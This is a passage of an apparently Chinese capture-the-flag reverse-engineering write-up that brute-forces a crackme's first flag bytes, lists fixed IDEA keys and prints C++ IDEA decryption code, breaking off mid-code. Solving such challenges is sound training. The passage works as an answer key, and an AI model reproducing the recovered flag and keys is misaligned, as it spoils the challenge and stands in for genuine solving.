number\">0xD06016F6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF00F9345</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30B5FFE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA0A4C5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6AB020F2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44042D73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84BE41DF</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x1E01F268</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDEBB9EC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4369E96A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83D385C6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x196C3671</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9D65ADD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF762575C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37D83BF0</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xAD678847</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6DDDE4EB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76DC4190</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB6662D3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2CD99E8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC63F227</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2D7FFA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x026D930A</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x98D220BD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58684C11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5BA3BBF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05005713</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9FBFE4A4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F058808</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71B18589</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB10BE925</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x2BB45A92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB0E363E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB61B38D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0BDBDF21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91646C96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51DE003A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F6A0DBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBFD06117</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x256FD2A0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE5D5BE0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7807C9A2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8BDA50E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x220216B9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE2B87A15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC0C7794</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0CB61B38</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x9609A88F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56B3C423</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD6D6A3E9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x166CCF45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8CD37CF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C69105E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62DD1DDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2677173</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x38D8C2C4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF862AE68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65B0D9C6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA50AB56A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3FB506DD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF0F6A71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD1BB67F0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11010B5C</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x8BBEB8EB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B04D447</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B6B51F4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xABD13D58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x316E8EEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1D4E243</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF60EFC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1FDA836E</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x856530D9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45DF5C75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD80D2BDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18B74777</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8208F4C0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42B2986C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C0695ED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xACBCF941</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x36034AF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6B9265A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCCCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCC00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6B9265A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCCCC</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">uint32_t</span> enc1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n      <span class=\"token number\">0x46A95BAD</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x1CAC84B6</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xA67CB2B2</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x32188937</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x4872D39F</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xF2A2E59B</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x011B94D2</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// 爆破前7字节</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> c <span class=\"token operator\">=</span> <span class=\"token number\">28</span><span class=\"token punctuation\">;</span> c <span class=\"token operator\">&lt;</span> <span class=\"token number\">132</span><span class=\"token punctuation\">;</span> c<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>box1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint8_t</span><span class=\"token punctuation\">)</span>c <span class=\"token operator\">^</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xB0E0E879</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> enc1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n          <span class=\"token punctuation\">&#123;</span>\n              <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n              <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>得到前七个字符为：<strong>moshui_</strong></p>\n<p>第三次Check是在case 0处，程序起始的时候启了一个线程，死循环然后这边判断前两次Check是否成功，然后进入最后一次Check代码。</p>\n<p><img src=\"/images/57-1744626745339-63.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/58-1744626745339-62.png\" loading=\"lazy\"></p>\n<p>开始的时候利用前五个字节以及括号内前七个字节生成了两个四字节密钥，然后又赋值了另外两个固定的密钥值。</p>\n<p>由于前五字节和括号内前七个字节是已知固定的，所以生成的密钥也是固定，可以直接提取计算完的密钥。</p>\n<p>密钥：<strong>0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF</strong></p>\n<p><img src=\"/images/59-1744626745339-64.png\" loading=\"lazy\"></p>\n<p>然后下面赋值了密文到v7，判断输入的字符串第29个字符是否为’}’，这边可知flag长度为29，然后利用密钥和输入字符串，进行加密，最后和v7判断。</p>\n<p><img src=\"/images/60-1744626745339-65.png\" loading=\"lazy\"></p>\n<p>加密是8字节8字节加密，观察sub_7FF7ADAB1640可知是IDEA加密算法，循环加密0x10000次没什么用，因为Input和Output在两个不同数组，所以和加密一次是一样结果。</p>\n<p>利用IDEA解密算法配合密钥解密v7的值即可得到后16字节，最后拼接得到完整flag。</p>\n<p><img src=\"/images/61-1744626745339-66.png\" loading=\"lazy\"></p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;bitset></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;cmath></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;algorithm></span></span>\n<span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> code<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typedef</span> bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">128</span><span class=\"token operator\">></span> key<span class=\"token punctuation\">;</span>\n\nbitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nbitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\ncode <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>code code_1<span class=\"token punctuation\">,</span> code code_2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> code_1 <span class=\"token operator\">^</span> code_2<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ncode <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>code code_1<span class=\"token punctuation\">,</span> code code_2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> tmp <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        tmp <span class=\"token operator\">+=</span> code_1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> code_2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    tmp <span class=\"token operator\">%=</span> <span class=\"token number\">65536</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token generic-function\"><span class=\"token function\">bitset</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ncode <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>code code_in<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> tmp <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        tmp <span class=\"token operator\">+=</span> code_in<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    tmp <span class=\"token operator\">=</span> <span class=\"token number\">65536</span> <span class=\"token operator\">-</span> tmp<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token generic-function\"><span class=\"token function\">bitset</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ncode <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>code code_1<span class=\"token punctuation\">,</span> code code_2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> tmp_1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> tmp_2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        tmp_1 <span class=\"token operator\">+=</span> code_1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        tmp_2 <span class=\"token operator\">+=</span> code_2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tmp_1 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        tmp_1 <span class=\"token operator\">=</span> <span class=\"token number\">65536</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tmp_2 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        tmp_2 <span class=\"token operator\">=</span> <span class=\"token number\">65536</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tmp_1 <span class=\"token operator\">*</span> tmp_2<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">65537</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token generic-function\"><span class=\"token function\">bitset</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>tmp <span class=\"token operator\">==</span> <span class=\"token number\">65536</span> <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">Exgcd</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">&amp;</span>x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">&amp;</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>b<span class=\"token punctuation\">)</span>\n        x <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span>\n        <span class=\"token function\">Exgcd</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> y <span class=\"token operator\">-=</span> a <span class=\"token operator\">/</span> b <span class=\"token operator\">*</span> x<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ncode <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>code code_in<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> tmp <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        tmp <span class=\"token operator\">+=</span> code_in<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> p <span class=\"token operator\">=</span> <span class=\"token number\">65537</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">Exgcd</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    x <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">%</span> p <span class=\"token operator\">+</span> p<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token generic-function\"><span class=\"token function\">bitset</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">subkeys_get</span><span class=\"token punctuation\">(</span>code keys_input<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    key keys<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            keys<span class=\"token punctuation\">[</span>j <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> keys_input<span class=\"token punctuation\">[</span><span class=\"token number\">7</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            sub_key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> keys<span class=\"token punctuation\">[</span><span class=\"token number\">127</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        key tmp_keys <span class=\"token operator\">=</span> keys <span class=\"token operator\">>></span> <span class=\"token number\">103</span><span class=\"token punctuation\">;</span>\n        keys <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>keys <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">25</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> tmp_keys<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> k<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n                sub_key<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> keys<span class=\"token punctuation\">[</span><span class=\"token number\">127</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">-</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    key tmp_keys <span class=\"token operator\">=</span> keys <span class=\"token operator\">>></span> <span class=\"token number\">103</span><span class=\"token punctuation\">;</span>\n    keys <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>keys <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">25</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> tmp_keys<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">48</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">52</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            sub_key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> keys<span class=\"token punctuation\">[</span><span class=\"token number\">127</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">-</span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span 